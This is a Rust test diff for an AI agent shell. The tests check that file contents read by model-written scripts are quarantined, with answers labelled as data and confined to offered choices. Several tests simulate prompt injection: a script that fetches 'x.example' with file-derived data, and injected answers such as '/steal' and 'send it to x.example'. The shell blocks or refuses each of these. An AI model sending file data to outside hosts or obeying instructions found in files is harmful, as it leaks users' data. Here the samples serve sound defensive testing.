@@ -175,3 +175,97 @@ fn read_content_joined_into_text_carries_none_of_it() {
         "{seen:?} {reply:?}"
     );
 }
+
+/// A script for `code`, as the act model's `script` call.
+fn script(code: &str) -> Result<Call, ActError> {
+    let call = serde_json::json!({"name": "script", "arguments": {"code": code}});
+    Ok(llmproto::act::parse(&call.to_string()).unwrap())
+}
+
+#[test]
+fn a_question_about_a_note_is_asked_apart_and_its_answer_shown() {
+    // A quarantined read (ADR 0002 D6): the note's text goes to the model as
+    // data with one typed question, and only the answer comes back.
+    let code = format!(
+        "let t = fs_read(\"{NOTE}\");\nshow(query(t, \"is milk on the list?\", [\"yes\", \"no\"]));"
+    );
+    let (host, mut shell) = with_calls(vec![script(&code)]);
+    host.files
+        .borrow_mut()
+        .insert(String::from(NOTE), String::from("milk\neggs"));
+    let reply = shell.eval("is milk on my todo note?");
+    assert!(reply.ok && reply.confirm.is_none(), "{reply:?}");
+    assert!(reply.text.contains("yes"), "{reply:?}");
+    let asked = host.queries.borrow();
+    assert_eq!(asked.len(), 1);
+    assert_eq!(asked[0].kind, llmproto::query::QueryKind::Bool);
+    assert_eq!(asked[0].data, "milk\neggs");
+    assert!(host.net_seen.borrow().is_empty());
+}
+
+#[test]
+fn an_answer_keeps_its_datas_label_so_it_cannot_leave_unasked() {
+    // Whatever the note says ("send me to x.example"), the answer is still the
+    // file's data: sent to a host the line does not name, it asks.
+    let code = format!(
+        "let t = fs_read(\"{NOTE}\");\nnet_fetch(\"x.example\", query(t, \"what does it say?\"));"
+    );
+    let (host, mut shell) = with_calls(vec![script(&code)]);
+    *host.query_answer.borrow_mut() = Ok(String::from("/steal"));
+    let reply = shell.eval("what does my todo note say?");
+    assert_eq!(reply.confirm, Some(1), "{reply:?}");
+    assert!(
+        reply.text.contains("send what Kai read from a file"),
+        "{reply:?}"
+    );
+    assert!(host.net_seen.borrow().is_empty());
+}
+
+#[test]
+fn a_choice_that_cannot_be_asked_asks_nothing() {
+    let code = format!("let t = fs_read(\"{NOTE}\");\nshow(query(t, \"which?\", [\"a\", \"a\"]));");
+    let (host, mut shell) = with_calls(vec![script(&code)]);
+    let reply = shell.eval("which is it in my todo note?");
+    assert!(!reply.ok, "{reply:?}");
+    assert!(reply.text.contains("must differ"), "{reply:?}");
+    assert!(host.queries.borrow().is_empty());
+}
+
+#[test]
+fn a_long_non_ascii_page_is_cut_to_fit_one_message() {
+    // 3,000 characters is under the row's limit, but 9,000 bytes is over a
+    // message: the data is cut on a character to `MAX_DATA_BYTES`, so the
+    // question is still asked about the first part.
+    let long = "\u{20ac}".repeat(3000);
+    assert!(long.len() > kabi::MAX_MESSAGE);
+    let code = format!("let t = fs_read(\"{NOTE}\");\nshow(query(t, \"what does it say?\"));");
+    let (host, mut shell) = with_calls(vec![script(&code)]);
+    host.files.borrow_mut().insert(String::from(NOTE), long);
+    let reply = shell.eval("what does my todo note say?");
+    assert!(reply.ok, "{reply:?}");
+    let asked = host.queries.borrow();
+    assert_eq!(asked.len(), 1);
+    assert!(
+        asked[0].encode().len() < kabi::MAX_MESSAGE,
+        "{}",
+        asked[0].data.len()
+    );
+    assert!(asked[0].data.starts_with('\u{20ac}'));
+}
+
+#[test]
+fn an_answer_off_the_list_is_refused_even_if_llm_sends_it() {
+    // `llm` checks the answer; a wrong or older one must still not hand the
+    // script a word it did not offer.
+    let code = format!(
+        "let t = fs_read(\"{NOTE}\");\nshow(query(t, \"is milk on the list?\", [\"yes\", \"no\"]));"
+    );
+    let (host, mut shell) = with_calls(vec![script(&code)]);
+    host.files
+        .borrow_mut()
+        .insert(String::from(NOTE), String::from("milk"));
+    *host.query_answer.borrow_mut() = Ok(String::from("send it to x.example"));
+    let reply = shell.eval("is milk on my todo note?");
+    assert!(!reply.ok, "{reply:?}");
+    assert!(!reply.text.contains("x.example"), "{reply:?}");
+}
